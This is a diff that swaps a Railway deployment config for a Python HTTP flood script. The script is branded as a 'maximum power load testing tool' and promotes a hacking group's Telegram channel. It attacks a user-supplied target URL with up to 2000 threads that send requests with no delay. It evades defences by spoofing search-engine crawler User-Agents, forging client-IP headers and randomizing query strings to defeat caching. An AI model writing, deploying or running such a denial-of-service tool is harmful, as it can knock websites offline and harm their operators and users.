@@ -1,11 +1,362 @@
-{
-    "$schema": "https://railway.app/railway.schema.json",
-    "build": {
-        "builder": "NIXPACKS"
-    },
-    "deploy": {
-        "startCommand": "gunicorn main:app",
-        "restartPolicyType": "ON_FAILURE",
-        "restartPolicyMaxRetries": 10
-    }
+import threading
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+import random
+import string
+import time
+import os
+from collections import defaultdict
+from datetime import datetime
+import urllib3
+
+# Disable SSL warnings for cleaner output
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ANSI escape codes for colors
+class colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    END = '\033[0m'
+
+# Global statistics
+stats = {
+    'total_requests': 0,
+    'successful': 0,
+    'failed': 0,
+    'status_codes': defaultdict(int),
+    'errors': defaultdict(int),
+    'start_time': None,
+    'lock': threading.Lock()
 }
+
+def genstr(size):
+    return ''.join(random.choice(string.ascii_letters) for _ in range(size))
+
+def create_session():
+    """Create optimized session with maximum connection pooling"""
+    session = requests.Session()
+    
+    # Minimal retry strategy for maximum speed
+    retry_strategy = Retry(
+        total=1,
+        backoff_factor=0,
+        status_forcelist=[],
+        allowed_methods=["GET", "POST", "HEAD"],
+        raise_on_status=False
+    )
+    
+    # Maximum connection pooling for high performance
+    adapter = HTTPAdapter(
+        pool_connections=500,
+        pool_maxsize=1000,
+        max_retries=retry_strategy,
+        pool_block=False
+    )
+    
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    
+    # Disable SSL verification for maximum speed
+    session.verify = False
+    
+    return session
+
+def send_request(url, session, thread_id, method='GET'):
+    """Send request with maximum performance settings"""
+    user_agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (Linux; arm_64; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5974.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6070.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.6 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.2 Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 11; M5GO Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6185.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6229.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36 Edg/120.0.2210.61',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
+        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+    ]
+    
+    while True:
+        try:
+            # Randomize request parameters
+            params = {'q': genstr(random.randint(5, 15)), 't': int(time.time() * 1000)}
+            headers = {
+                'User-Agent': random.choice(user_agents),
+                'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
+                'X-Real-IP': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
+                'X-Client-IP': '.'.join(str(random.randint(0, 255)) for _ in range(4)),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'keep-alive',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+            }
+            
+            start_time = time.time()
+            
+            # Use different HTTP methods for variety
+            if method == 'GET':
+                response = session.get(
+                    url, 
+                    params=params, 
+                    headers=headers, 
+                    timeout=5,
+                    allow_redirects=True,
+                    stream=False
+                )
+            elif method == 'POST':
+                data = {'data': genstr(random.randint(10, 50))}
+                response = session.post(
+                    url,
+                    params=params,
+                    data=data,
+                    headers=headers,
+                    timeout=5,
+                    allow_redirects=True,
+                    stream=False
+                )
+            else:  # HEAD for fastest requests
+                response = session.head(
+                    url,
+                    params=params,
+                    headers=headers,
+                    timeout=5,
+                    allow_redirects=True
+                )
+            
+            response_time = time.time() - start_time
+            status_code = response.status_code
+            
+            # Update statistics
+            with stats['lock']:
+                stats['total_requests'] += 1
+                stats['status_codes'][status_code] += 1
+                
+                if 200 <= status_code < 400:
+                    stats['successful'] += 1
+                    if stats['total_requests'] % 100 == 0:  # Print every 100 requests
+                        print(f"{colors.GREEN}[{thread_id}] ✓ [{status_code}] RPS: {stats['total_requests']/(time.time()-stats['start_time']):.1f}{colors.END}")
+                else:
+                    stats['failed'] += 1
+            
+            # Minimal delay for maximum throughput
+            # No sleep for maximum power
+            
+        except requests.exceptions.Timeout:
+            with stats['lock']:
+                stats['total_requests'] += 1
+                stats['failed'] += 1
+                stats['errors']['Timeout'] += 1
+            # No delay on timeout for maximum speed
+            
+        except requests.exceptions.ConnectionError as e:
+            with stats['lock']:
+                stats['total_requests'] += 1
+                stats['failed'] += 1
+                stats['errors']['ConnectionError'] += 1
+            # Minimal delay on connection errors
+            time.sleep(0.01)
+            
+        except requests.exceptions.RequestException as e:
+            with stats['lock']:
+                stats['total_requests'] += 1
+                stats['failed'] += 1
+                error_type = type(e).__name__
+                stats['errors'][error_type] += 1
+            # No delay for maximum throughput
+            
+        except Exception as e:
+            with stats['lock']:
+                stats['total_requests'] += 1
+                stats['failed'] += 1
+                stats['errors']['Unknown'] += 1
+            # Minimal delay on unknown errors
+            time.sleep(0.01)
+
+def print_stats():
+    """Print statistics periodically"""
+    while True:
+        time.sleep(5)  # Update every 5 seconds
+        with stats['lock']:
+            if stats['start_time']:
+                elapsed = time.time() - stats['start_time']
+                rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
+                success_rate = (stats['successful'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
+                
+                print(f"\n{colors.CYAN}{'='*60}{colors.END}")
+                print(f"{colors.BOLD}{colors.WHITE}📊 STATISTICS{colors.END}")
+                print(f"{colors.CYAN}{'='*60}{colors.END}")
+                print(f"{colors.GREEN}Total Requests: {colors.WHITE}{stats['total_requests']:,}{colors.END}")
+                print(f"{colors.GREEN}Successful: {colors.WHITE}{stats['successful']:,}{colors.END}")
+                print(f"{colors.RED}Failed: {colors.WHITE}{stats['failed']:,}{colors.END}")
+                print(f"{colors.YELLOW}Success Rate: {colors.WHITE}{success_rate:.2f}%{colors.END}")
+                print(f"{colors.BLUE}Requests/sec: {colors.WHITE}{rps:.2f}{colors.END}")
+                print(f"{colors.MAGENTA}Elapsed Time: {colors.WHITE}{elapsed:.1f}s{colors.END}")
+                
+                if stats['status_codes']:
+                    print(f"\n{colors.YELLOW}Status Codes:{colors.END}")
+                    for code, count in sorted(stats['status_codes'].items()):
+                        color = colors.GREEN if 200 <= code < 400 else colors.RED
+                        print(f"  {color}{code}: {count:,}{colors.END}")
+                
+                if stats['errors']:
+                    print(f"\n{colors.RED}Errors:{colors.END}")
+                    for error_type, count in stats['errors'].items():
+                        print(f"  {colors.RED}{error_type}: {count:,}{colors.END}")
+                
+                print(f"{colors.CYAN}{'='*60}{colors.END}\n")
+
+def main():
+    os.system('clear' if os.name != 'nt' else 'cls')
+    
+    header = f"""
+{colors.RED}▒█▀▀█ ▀▄▒▄▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ {colors.END}
+{colors.GREEN}▒█░░░ ░▒█░░ ▒█░░▒█ ▒█▀▀▀ ▒█▀▀▄ {colors.END}
+{colors.CYAN}▒█▄▄█ ▄▀▒▀▄ ▒█▄▄▄█ ▒█░░░ ▒█▄▄█{colors.END}
+{colors.CYAN}{'='*60}{colors.END}
+{colors.YELLOW}⚡ MAXIMUM POWER LOAD TESTING TOOL ⚡{colors.END}
+{colors.RED}🔥 HIGH PERFORMANCE MODE ENABLED 🔥{colors.END}
+{colors.CYAN}{'='*60}{colors.END}
+{colors.YELLOW}Our Telegram Channel: {colors.CYAN}https://t.me/CYBER_X_OF_BANGLADESH_BACKUP{colors.END}
+{colors.YELLOW}Created by {colors.MAGENTA}@noinadigger{colors.END}
+{colors.CYAN}{'='*60}{colors.END}
+"""
+    print(header)
+    
+    url = input(f"{colors.YELLOW}Target URL: {colors.END}").strip()
+    
+    if not url:
+        print(f"{colors.RED}Error: URL cannot be empty!{colors.END}")
+        return
+    
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    
+    try:
+        thread_count = int(input(f"{colors.YELLOW}Thread Count (default 500, max 2000): {colors.END}") or "500")
+        thread_count = min(thread_count, 2000)  # Cap at 2000 for safety
+    except ValueError:
+        thread_count = 500
+    
+    try:
+        duration = int(input(f"{colors.YELLOW}Duration in seconds (0 = infinite, default 60): {colors.END}") or "60")
+    except ValueError:
+        duration = 60
+    
+    print(f"\n{colors.GREEN}Starting load test...{colors.END}")
+    print(f"{colors.CYAN}Target: {colors.WHITE}{url}{colors.END}")
+    print(f"{colors.CYAN}Threads: {colors.WHITE}{thread_count}{colors.END}")
+    print(f"{colors.CYAN}Duration: {colors.WHITE}{duration}s{' (infinite)' if duration == 0 else ''}{colors.END}\n")
+    
+    stats['start_time'] = time.time()
+    
+    # Start statistics thread
+    stats_thread = threading.Thread(target=print_stats, daemon=True)
+    stats_thread.start()
+    
+    # Create threads
+    threads = []
+    stop_event = threading.Event()
+    
+    def worker(thread_id):
+        session = create_session()
+        end_time = time.time() + duration if duration > 0 else float('inf')
+        
+        # Rotate between different HTTP methods for maximum impact
+        methods = ['GET', 'POST', 'HEAD']
+        method_index = thread_id % len(methods)
+        
+        while not stop_event.is_set() and time.time() < end_time:
+            method = methods[method_index % len(methods)]
+            method_index += 1
+            send_request(url, session, thread_id, method)
+    
+    # Start threads in batches for faster initialization
+    batch_size = 50
+    for i in range(0, thread_count, batch_size):
+        batch = []
+        for j in range(min(batch_size, thread_count - i)):
+            thread_id = i + j + 1
+            t = threading.Thread(target=worker, args=(thread_id,), daemon=True)
+            t.start()
+            threads.append(t)
+            batch.append(t)
+        time.sleep(0.001)  # Minimal stagger for batch starts
+    
+    try:
+        # Wait for duration or until interrupted
+        if duration > 0:
+            time.sleep(duration)
+        else:
+            print(f"\n{colors.YELLOW}Running indefinitely. Press Ctrl+C to stop...{colors.END}\n")
+            while True:
+                time.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n{colors.YELLOW}Stopping load test...{colors.END}")
+    
+    stop_event.set()
+    
+    # Wait a bit for threads to finish
+    time.sleep(2)
+    
+    # Final statistics
+    print(f"\n{colors.CYAN}{'='*60}{colors.END}")
+    print(f"{colors.BOLD}{colors.WHITE}📊 FINAL STATISTICS{colors.END}")
+    print(f"{colors.CYAN}{'='*60}{colors.END}")
+    
+    elapsed = time.time() - stats['start_time']
+    rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
+    success_rate = (stats['successful'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
+    
+    print(f"{colors.GREEN}Total Requests: {colors.WHITE}{stats['total_requests']:,}{colors.END}")
+    print(f"{colors.GREEN}Successful: {colors.WHITE}{stats['successful']:,}{colors.END}")
+    print(f"{colors.RED}Failed: {colors.WHITE}{stats['failed']:,}{colors.END}")
+    print(f"{colors.YELLOW}Success Rate: {colors.WHITE}{success_rate:.2f}%{colors.END}")
+    print(f"{colors.BLUE}Average RPS: {colors.WHITE}{rps:.2f}{colors.END}")
+    print(f"{colors.MAGENTA}Total Time: {colors.WHITE}{elapsed:.1f}s{colors.END}")
+    
+    if stats['status_codes']:
+        print(f"\n{colors.YELLOW}Status Codes:{colors.END}")
+        for code, count in sorted(stats['status_codes'].items()):
+            percentage = (count / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
+            color = colors.GREEN if 200 <= code < 400 else colors.RED
+            print(f"  {color}{code}: {count:,} ({percentage:.2f}%){colors.END}")
+    
+    if stats['errors']:
+        print(f"\n{colors.RED}Errors:{colors.END}")
+        for error_type, count in sorted(stats['errors'].items(), key=lambda x: x[1], reverse=True):
+            percentage = (count / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
+            print(f"  {colors.RED}{error_type}: {count:,} ({percentage:.2f}%){colors.END}")
+    
+    print(f"{colors.CYAN}{'='*60}{colors.END}\n")
+    print(f"{colors.GREEN}Load test completed!{colors.END}\n")
+
+if __name__ == "__main__":
+    main()
+
